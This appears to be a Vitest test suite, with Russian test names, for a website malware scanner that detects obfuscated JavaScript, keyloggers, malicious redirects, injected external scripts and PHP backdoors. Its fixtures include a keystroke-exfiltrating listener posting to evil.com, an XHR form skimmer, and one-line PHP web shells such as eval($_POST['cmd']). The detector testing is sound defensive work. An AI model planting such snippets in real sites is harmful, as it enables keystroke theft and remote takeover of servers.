import { describe, it, expect } from 'vitest';
import { detectObfuscation } from '../detect-obfuscation.js';
import { detectKeylogger } from '../detect-keylogger.js';
import { detectRedirect } from '../detect-redirect.js';
import { detectDocWriteScript } from '../detect-document-write-script.js';
import { detectPhpBackdoors } from '../../../php/detect-php-backdoors.js';
import { parseJs } from '../../ast/parse.js';

// ───────────────────────────── detectObfuscation ─────────────────────────────

describe('detectObfuscation', () => {
  it('детектирует _0x hex-переменные (>15% от всех идентификаторов)', () => {
    // Many _0x identifiers → obfuscated
    const obfuscated = `var _0x1a2b=_0x1a2b3c;var _0x4c5d=_0x4c5d6e;var _0x7e8f=_0x7e8f0a;
    var _0x1234=_0x1234ab;var _0x5678=_0x5678cd;function a(){return _0x1a2b(_0x4c5d);}`;
    expect(detectObfuscation(obfuscated)).toBe(true);
  });

  it('детектирует Dean Edwards packer (eval(function(p,a,c,k,e...)', () => {
    const packed = `eval(function(p,a,c,k,e,d){e=function(c){return c};...}('hello',5,5,''.split('|')))`;
    expect(detectObfuscation(packed)).toBe(true);
  });

  it('детектирует String[fromCharCode] обфускацию', () => {
    // Needs 2 criteria to trigger. Add _0x vars as well.
    const source = `var _0x1111=String['fromCharCode'](72,101);var _0x2222=_0x3333;var _0x4444=_0x5555;`;
    expect(detectObfuscation(source)).toBe(true);
  });

  it('НЕ детектирует обычный JS-код', () => {
    const normal = `
      function handleClick(event) {
        event.preventDefault();
        document.querySelector('.menu').classList.toggle('open');
      }
      document.addEventListener('DOMContentLoaded', handleClick);
    `;
    expect(detectObfuscation(normal)).toBe(false);
  });

  it('НЕ детектирует файл с одной _0x переменной среди многих обычных', () => {
    const src = `
      var _0x1234 = 'hello';
      function initialize() {
        var counter = 0;
        var message = 'test string';
        var element = document.querySelector('.item');
        element.innerHTML = _0x1234;
        element.classList.add('active');
        console.log(message, counter);
        return element;
      }
    `;
    expect(detectObfuscation(src)).toBe(false);
  });
});

// ───────────────────────────── detectKeylogger ───────────────────────────────

describe('detectKeylogger', () => {
  it('детектирует addEventListener(keydown) + fetch внутри callback', () => {
    const source = `
      document.addEventListener('keydown', function(e) {
        fetch('https://evil.com/keylog', { method: 'POST', body: e.key });
      });
    `;
    const ast = parseJs(source, 'test.js');
    expect(ast).not.toBeNull();
    const results = detectKeylogger(ast!, source);
    expect(results.length).toBeGreaterThan(0);
    expect(results[0]!.threatType).toBe('keylogger');
    expect(results[0]!.shouldRemove).toBe(false);
  });

  it('детектирует addEventListener(input) + XHR', () => {
    const source = `
      input.addEventListener('input', function(e) {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'https://steal.io/log');
        xhr.send(e.target.value);
      });
    `;
    const ast = parseJs(source, 'test.js');
    expect(ast).not.toBeNull();
    const results = detectKeylogger(ast!, source);
    expect(results.length).toBeGreaterThan(0);
  });

  it('НЕ детектирует addEventListener(keydown) без сетевых вызовов', () => {
    const source = `
      document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape') modal.style.display = 'none';
      });
    `;
    const ast = parseJs(source, 'test.js');
    expect(ast).not.toBeNull();
    const results = detectKeylogger(ast!, source);
    expect(results.length).toBe(0);
  });

  it('НЕ детектирует addEventListener(click) + fetch', () => {
    const source = `
      btn.addEventListener('click', function() {
        fetch('/api/submit', { method: 'POST' });
      });
    `;
    const ast = parseJs(source, 'test.js');
    expect(ast).not.toBeNull();
    const results = detectKeylogger(ast!, source);
    expect(results.length).toBe(0);
  });
});

// ───────────────────────────── detectRedirect ────────────────────────────────

describe('detectRedirect', () => {
  const ctx = { source: '', relPath: 'test.js', mainHost: 'mysite.com' };

  it('детектирует window.location = external URL', () => {
    const source = `window.location = 'https://evil.com/redirect';`;
    const ast = parseJs(source, 'test.js');
    expect(ast).not.toBeNull();
    const results = detectRedirect(ast!, { ...ctx, source });
    expect(results.length).toBeGreaterThan(0);
    expect(results[0]!.threatType).toBe('redirect');
    expect(results[0]!.shouldRemove).toBe(false);
  });

  it('детектирует location.href = external URL', () => {
    const source = `location.href = 'https://tracker.net/go?id=123';`;
    const ast = parseJs(source, 'test.js');
    expect(ast).not.toBeNull();
    const results = detectRedirect(ast!, { ...ctx, source });
    expect(results.length).toBeGreaterThan(0);
  });

  it('детектирует location.replace(external URL)', () => {
    const source = `location.replace('https://spy.io/collect');`;
    const ast = parseJs(source, 'test.js');
    expect(ast).not.toBeNull();
    const results = detectRedirect(ast!, { ...ctx, source });
    expect(results.length).toBeGreaterThan(0);
  });

  it('НЕ детектирует location.href = внутренний URL', () => {
    const source = `location.href = '/thank-you';`;
    const ast = parseJs(source, 'test.js');
    expect(ast).not.toBeNull();
    const results = detectRedirect(ast!, { ...ctx, source });
    expect(results.length).toBe(0);
  });

  it('НЕ детектирует window.location.href = mainHost URL', () => {
    const source = `window.location.href = 'https://mysite.com/success';`;
    const ast = parseJs(source, 'test.js');
    expect(ast).not.toBeNull();
    const results = detectRedirect(ast!, { ...ctx, source });
    expect(results.length).toBe(0);
  });
});

// ───────────────────────────── detectDocWriteScript ─────────────────────────

describe('detectDocWriteScript', () => {
  const ctx = { source: '', relPath: 'test.js', mainHost: 'mysite.com' };

  it('детектирует document.write с внешним <script src>', () => {
    const source = `document.write('<script src="https://evil.com/tracker.js"><\\/script>');`;
    const ast = parseJs(source, 'test.js');
    expect(ast).not.toBeNull();
    const results = detectDocWriteScript(ast!, { ...ctx, source });
    expect(results.length).toBeGreaterThan(0);
    expect(results[0]!.shouldRemove).toBe(true);
    expect(results[0]!.threatType).toBe('exfil-document-write');
  });

  it('детектирует document.writeln с внешним <script src>', () => {
    const source = `document.writeln('<script src="https://spy.io/js/track.js"></script>');`;
    const ast = parseJs(source, 'test.js');
    expect(ast).not.toBeNull();
    const results = detectDocWriteScript(ast!, { ...ctx, source });
    expect(results.length).toBeGreaterThan(0);
  });

  it('НЕ детектирует document.write без script src', () => {
    const source = `document.write('<p>Hello World</p>');`;
    const ast = parseJs(source, 'test.js');
    expect(ast).not.toBeNull();
    const results = detectDocWriteScript(ast!, { ...ctx, source });
    expect(results.length).toBe(0);
  });

  it('НЕ детектирует document.write с локальным <script src>', () => {
    const source = `document.write('<script src="/local/bundle.js"></script>');`;
    const ast = parseJs(source, 'test.js');
    expect(ast).not.toBeNull();
    const results = detectDocWriteScript(ast!, { ...ctx, source });
    expect(results.length).toBe(0);
  });
});

// ───────────────────────────── detectPhpBackdoors ────────────────────────────

describe('detectPhpBackdoors', () => {
  it('детектирует eval($_POST)', () => {
    const php = `<?php eval($_POST['cmd']); ?>`;
    const results = detectPhpBackdoors(php, 'shell.php');
    expect(results.length).toBeGreaterThan(0);
    expect(results[0]!.type).toBe('PHP_BACKDOOR_WARN');
  });

  it('детектирует system($_GET)', () => {
    const php = `<?php system($_GET['cmd']); ?>`;
    const results = detectPhpBackdoors(php, 'backdoor.php');
    expect(results.length).toBeGreaterThan(0);
  });

  it('детектирует gzinflate(base64_decode(...))', () => {
    const php = `<?php $x = gzinflate(base64_decode($data)); eval($x); ?>`;
    const results = detectPhpBackdoors(php, 'evil.php');
    expect(results.length).toBeGreaterThan(0);
  });

  it('НЕ детектирует нормальный PHP-код', () => {
    const php = `<?php echo '<h1>Hello World</h1>'; $name = htmlspecialchars($_GET['name'] ?? ''); ?>`;
    const results = detectPhpBackdoors(php, 'index.php');
    expect(results.length).toBe(0);
  });
});
